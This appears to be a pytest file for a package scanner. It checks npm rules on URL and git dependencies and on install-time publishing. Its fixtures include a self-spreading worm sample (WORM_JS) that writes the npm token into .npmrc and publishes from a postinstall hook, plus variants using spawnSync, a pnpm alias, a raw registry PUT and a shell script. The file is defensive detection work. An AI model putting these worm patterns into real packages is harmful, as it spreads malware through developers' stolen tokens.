"""npm supply chain: dependencies fetched from outside the registry (ST-NPM-URL-DEP,
ST-NPM-GIT-DEP), and install-time code that publishes packages (ST-NPM-INSTALL-PUBLISH).

A dependency given as a URL is fetched from that host when the package is installed: its code is
not in the registry, a scan of the package never sees it, and it can change at any time (the
"remote dynamic dependency" of the PhantomRaven campaign). A self-spreading worm publishes from
install-time code with the npm token it finds on the machine. Release tools run `npm publish`
from a command the maintainer types, never at install, and stay clean."""

from __future__ import annotations

import json
from pathlib import Path

from skilltotal.engine import analyze_directory
from skilltotal.models import Component, ThreatClass


def _scan(tmp_path: Path, files: dict[str, str | dict]):
    for name, text in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(text, dict):
            text = json.dumps(text, indent=2)
        path.write_text(text, encoding="utf-8", newline="\n")
    return analyze_directory(tmp_path, Component(name="x", type="npm_package", source="x"))


def _finding(report, rule):
    return next((f for f in report.findings if f.id == rule), None)


def _pkg(**fields) -> dict:
    return {"name": "x", "version": "1.0.0", **fields}


# --- dependencies from outside the registry --------------------------------------------------

def test_a_dependency_fetched_from_a_url_is_a_risk(tmp_path):
    report = _scan(tmp_path, {"package.json": _pkg(dependencies={
        "left-pad": "^1.3.0",
        "ui-styles": "http://packages.example.invalid/ui-styles-1.0.0.tgz",
    })})
    finding = _finding(report, "ST-NPM-URL-DEP")
    assert finding is not None
    assert finding.threat_class == ThreatClass.RISKY_CONSTRUCT
    assert len(finding.evidence) == 1
    assert "packages.example.invalid" in finding.evidence[0].snippet
    assert _finding(report, "ST-NPM-GIT-DEP") is None


def test_optional_and_peer_dependencies_count_too(tmp_path):
    report = _scan(tmp_path, {"package.json": _pkg(
        optionalDependencies={"a": "https://cdn.example.invalid/a.tgz"},
        peerDependencies={"b": "https://cdn.example.invalid/b.tgz"},
    )})
    assert len(_finding(report, "ST-NPM-URL-DEP").evidence) == 2


def test_a_git_or_github_dependency_is_a_lesser_risk(tmp_path):
    report = _scan(tmp_path, {"package.json": _pkg(dependencies={
        "a": "github:user/a#v1.0.0",
        "b": "git+https://gitlab.example.invalid/user/b.git",
        "c": "user/c",
        "d": "https://codeload.github.com/user/d/tar.gz/main",
    })})
    finding = _finding(report, "ST-NPM-GIT-DEP")
    assert finding is not None and len(finding.evidence) == 4
    assert finding.threat_class == ThreatClass.RISKY_CONSTRUCT
    assert _finding(report, "ST-NPM-URL-DEP") is None


def test_registry_ranges_aliases_and_local_paths_are_not_flagged(tmp_path):
    report = _scan(tmp_path, {"package.json": _pkg(dependencies={
        "a": "^1.2.3", "b": "~2.0.0", "c": "latest", "d": "1.x", "e": ">=1 <3",
        "f": "npm:left-pad@^1.3.0", "g": "file:../g", "h": "workspace:*", "i": "link:../i",
        "j": "*", "k": "",
    })})
    assert _finding(report, "ST-NPM-URL-DEP") is None
    assert _finding(report, "ST-NPM-GIT-DEP") is None


def test_dev_dependencies_are_not_installed_by_consumers(tmp_path):
    report = _scan(tmp_path, {"package.json": _pkg(devDependencies={
        "a": "https://cdn.example.invalid/a.tgz", "b": "github:user/b",
    })})
    assert _finding(report, "ST-NPM-URL-DEP") is None
    assert _finding(report, "ST-NPM-GIT-DEP") is None


def test_the_same_spec_in_dev_dependencies_does_not_move_the_evidence(tmp_path):
    url = "https://cdn.example.invalid/a.tgz"
    report = _scan(tmp_path, {"package.json": _pkg(devDependencies={"a": url},
                                                   dependencies={"a": url})})
    ev = _finding(report, "ST-NPM-URL-DEP").evidence
    assert len(ev) == 1
    text = (tmp_path / "package.json").read_text(encoding="utf-8").splitlines()
    assert text.index(next(line for line in text if '"dependencies"' in line)) < ev[0].line_start


def test_a_package_json_in_tests_is_not_scored(tmp_path):
    report = _scan(tmp_path, {"package.json": _pkg(),
                              "tests/fixtures/app/package.json": _pkg(
                                  dependencies={"a": "https://cdn.example.invalid/a.tgz"})})
    assert _finding(report, "ST-NPM-URL-DEP") is None


# --- install-time publishing (worm) ------------------------------------------------------------

WORM_JS = """\
const { execSync } = require("child_process");
const fs = require("fs");
const token = process.env.NPM_TOKEN;
fs.writeFileSync(".npmrc", `//registry.npmjs.org/:_authToken=${token}\\n`);
execSync("npm version patch --no-git-tag-version");
execSync("npm publish --access public");
"""


def test_install_time_code_that_publishes_is_malicious(tmp_path):
    report = _scan(tmp_path, {
        "package.json": _pkg(scripts={"postinstall": "node setup.js"}),
        "setup.js": WORM_JS,
    })
    finding = _finding(report, "ST-NPM-INSTALL-PUBLISH")
    assert finding is not None
    assert finding.threat_class == ThreatClass.MALICIOUS_INDICATOR
    assert {ev.file for ev in finding.evidence} == {"setup.js"}
    assert any("npm publish" in ev.snippet for ev in finding.evidence)


def test_spawn_with_a_publish_argument_and_a_bundled_alias_are_found(tmp_path):
    report = _scan(tmp_path, {
        "package.json": _pkg(scripts={"preinstall": "node lib/a.js && node lib/b.js"}),
        "lib/a.js": 'require("child_process").spawnSync("npm", ["publish", dir]);\n',
        "lib/b.js": ('var o=require("child_process");'
                     '(0,o.execSync)("pnpm publish --no-git-checks");\n'),
    })
    assert {ev.file for ev in _finding(report, "ST-NPM-INSTALL-PUBLISH").evidence} == {
        "lib/a.js", "lib/b.js"}


def test_a_publish_document_put_to_the_registry_is_found(tmp_path):
    report = _scan(tmp_path, {
        "package.json": _pkg(scripts={"install": "node i.js"}),
        "i.js": (
            "const body = { name, versions: { [v]: meta }, 'dist-tags': { latest: v },\n"
            "  _attachments: { [file]: { data: tgz.toString('base64') } } };\n"
            "await fetch(`https://registry.npmjs.org/${name}`, { method: 'PUT', body });\n"
        ),
    })
    assert _finding(report, "ST-NPM-INSTALL-PUBLISH") is not None


def test_a_shell_install_script_that_publishes_is_found(tmp_path):
    report = _scan(tmp_path, {
        "package.json": _pkg(scripts={"postinstall": "sh ./scripts/post.sh"}),
        "scripts/post.sh": "#!/bin/sh\ncd /tmp/pkg && npm publish\n",
    })
    assert _finding(report, "ST-NPM-INSTALL-PUBLISH") is not None


def test_a_release_tool_that_publishes_from_its_command_is_clean(tmp_path):
    report = _scan(tmp_path, {
        "package.json": _pkg(bin={"release": "cli.js"}),
        "cli.js": 'const { execSync } = require("child_process");\nexecSync("npm publish");\n',
    })
    assert _finding(report, "ST-NPM-INSTALL-PUBLISH") is None


def test_an_install_script_that_only_mentions_publishing_is_clean(tmp_path):
    report = _scan(tmp_path, {
        "package.json": _pkg(scripts={"postinstall": "node notice.js"}),
        "notice.js": (
            "// Run `npm publish` from the repository root, never from here.\n"
            'console.log("Installed. To release your own fork, run npm publish.");\n'
        ),
    })
    assert _finding(report, "ST-NPM-INSTALL-PUBLISH") is None


def test_a_prepublish_or_publish_script_is_not_install_time(tmp_path):
    report = _scan(tmp_path, {
        "package.json": _pkg(scripts={"prepublishOnly": "node release.js",
                                      "release": "npm publish"}),
        "release.js": 'require("child_process").execSync("npm publish");\n',
    })
    assert _finding(report, "ST-NPM-INSTALL-PUBLISH") is None
